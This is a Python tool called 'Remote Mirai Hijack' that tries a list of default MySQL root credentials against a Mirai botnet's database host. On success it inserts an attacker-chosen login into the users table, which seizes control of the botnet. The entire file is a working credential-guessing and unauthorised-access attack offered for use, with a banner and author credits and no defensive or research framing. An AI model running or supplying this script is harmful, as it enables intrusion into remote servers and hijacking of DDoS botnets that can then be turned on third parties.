# Project Name: Remote Mirai Hijack (RMH)
# Project Author: VoidLSD, Oxycontin
# Project Reason: Remote Mirai Hijack was made to hijack mirais using a vulnerability that is often overlooked by DDoS script kiddies.

import mysql.connector
from colorama import Fore, init
import os


# Common SQL combos used by low quality botnet administrators.
combos = ["root:", "root:root", "root:botnet", "root:net", "root:password", "root:admin", "root:sql", "root:Mana"]


# Checks if system is Windows or Linux and performs required tasks.
if os.name == 'nt':
    os.system('cls')
    init(convert=True)
else:
    os.system('clear')


# Intro banner, printed on start.
intro = f"""
 {Fore.RED}██████{Fore.LIGHTBLUE_EX}╗ {Fore.RED}███{Fore.LIGHTBLUE_EX}╗  {Fore.RED} ███{Fore.LIGHTBLUE_EX}╗{Fore.RED}██{Fore.LIGHTBLUE_EX}╗ {Fore.RED} ██{Fore.LIGHTBLUE_EX}╗
 {Fore.RED}██{Fore.LIGHTBLUE_EX}╔══{Fore.RED}██{Fore.LIGHTBLUE_EX}╗{Fore.RED}████{Fore.LIGHTBLUE_EX}╗ {Fore.RED}████{Fore.LIGHTBLUE_EX}║{Fore.RED}██{Fore.LIGHTBLUE_EX}║ {Fore.RED} ██{Fore.LIGHTBLUE_EX}║
 {Fore.RED}██████{Fore.LIGHTBLUE_EX}╔╝{Fore.RED}██{Fore.LIGHTBLUE_EX}╔{Fore.RED}████{Fore.LIGHTBLUE_EX}╔{Fore.RED}██{Fore.LIGHTBLUE_EX}║{Fore.RED}███████{Fore.LIGHTBLUE_EX}║
 {Fore.RED}██{Fore.LIGHTBLUE_EX}╔══{Fore.RED}██{Fore.LIGHTBLUE_EX}╗{Fore.RED}██{Fore.LIGHTBLUE_EX}║╚{Fore.RED}██{Fore.LIGHTBLUE_EX}╔╝{Fore.RED}██{Fore.LIGHTBLUE_EX}║{Fore.RED}██{Fore.LIGHTBLUE_EX}╔══{Fore.RED}██{Fore.LIGHTBLUE_EX}║
 {Fore.RED}██{Fore.LIGHTBLUE_EX}║  {Fore.RED}██{Fore.LIGHTBLUE_EX}║{Fore.RED}██{Fore.LIGHTBLUE_EX}║ ╚═╝{Fore.RED} ██{Fore.LIGHTBLUE_EX}║{Fore.RED}██{Fore.LIGHTBLUE_EX}║ {Fore.RED} ██{Fore.LIGHTBLUE_EX}║
 {Fore.LIGHTBLUE_EX}╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
    Remote Mirai Hijack
        Created by:
   {Fore.RED}Oxycontin{Fore.LIGHTBLUE_EX} and {Fore.RED}VoidLSD

 {Fore.RED}╔────══KNOWN SUPPORT══────╗
 {Fore.RED}│ {Fore.LIGHTBLUE_EX}Mana{Fore.RED}, {Fore.LIGHTBLUE_EX}HoHo{Fore.RED}, {Fore.LIGHTBLUE_EX}Rift{Fore.RED},{Fore.LIGHTBLUE_EX} Kuria{Fore.RED} │
 {Fore.RED}╚─────────────────────────╝
"""
print(intro)
variant = input("Variant (Database Name): ")  # This is the database name, it is almost always the name of the variant.
host = input('Botnet Host: ')  # The IP address of the SQL server.
username = input('Username Insert: ')  # The username to add.
password = input('Password Insert: ')  # The password to add.
sql = f"INSERT INTO users (username, password) VALUES ({username}, {password})"  # SQL Payload/command.


# This for loop iterates through each combo and attempts each one.
for combo in combos:
    try:
        mydb = mysql.connector.connect(host=host, user=combo.split(":")[0], password=combo.split(":")[1], database=variant)
        mycursor = mydb.cursor()
        mycursor.execute(sql)
        mydb.commit()
        print("Remote Mirai Hijack has successfully been ran! ID:", mycursor.lastrow)
        print(f"Username and Password inserted into the table: {username}:{password}")
        break
    except:
        print(f"[Failed Attempt] {combo}")
